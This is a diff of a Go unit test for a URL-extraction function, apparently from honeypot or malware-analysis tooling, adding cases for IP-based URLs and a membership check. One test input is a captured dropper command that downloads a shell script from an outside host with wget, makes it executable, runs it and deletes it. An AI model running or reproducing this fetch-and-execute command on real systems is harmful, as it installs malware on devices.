@@ -37,6 +37,16 @@ func TestExtractUrls(t *testing.T) {
 			textToSearch: "exefile=cd /tmp; wget http://interpol.edu.pl/fuez/potar.sh -O jdsp.sh; chmod 777 jdsp.sh;sh jdsp.sh Avtech;rm -rf jdsp.sh",
 			urlsToFind:   []string{"http://interpol.edu.pl/fuez/potar.sh"},
 		},
+		{
+			description:  "finds multiple urls, one ip based",
+			textToSearch: "http://www.example.org/ 127.0.0.1/aa.sh",
+			urlsToFind:   []string{"http://www.example.org/", "127.0.0.1/aa.sh"},
+		},
+		{
+			description:  "finds multiple urls, one ip based with port",
+			textToSearch: "http://www.example.org/ 127.0.0.1:8000/aa.sh",
+			urlsToFind:   []string{"http://www.example.org/", "127.0.0.1:8000/aa.sh"},
+		},
 	} {
 
 		t.Run(test.description, func(t *testing.T) {
@@ -44,6 +54,18 @@ func TestExtractUrls(t *testing.T) {
 			if len(r) != len(test.urlsToFind) {
 				t.Errorf("expected %d, got %d urls (%v)", len(test.urlsToFind), len(r), r)
 			}
+
+			left := make(map[string]bool)
+			for _, a := range r {
+				left[a] = true
+			}
+
+			for _, a := range test.urlsToFind {
+				if _, ok := left[a]; !ok {
+					t.Errorf("not in: %s -> %v", a, left)
+				}
+			}
+
 		})
 	}
 }
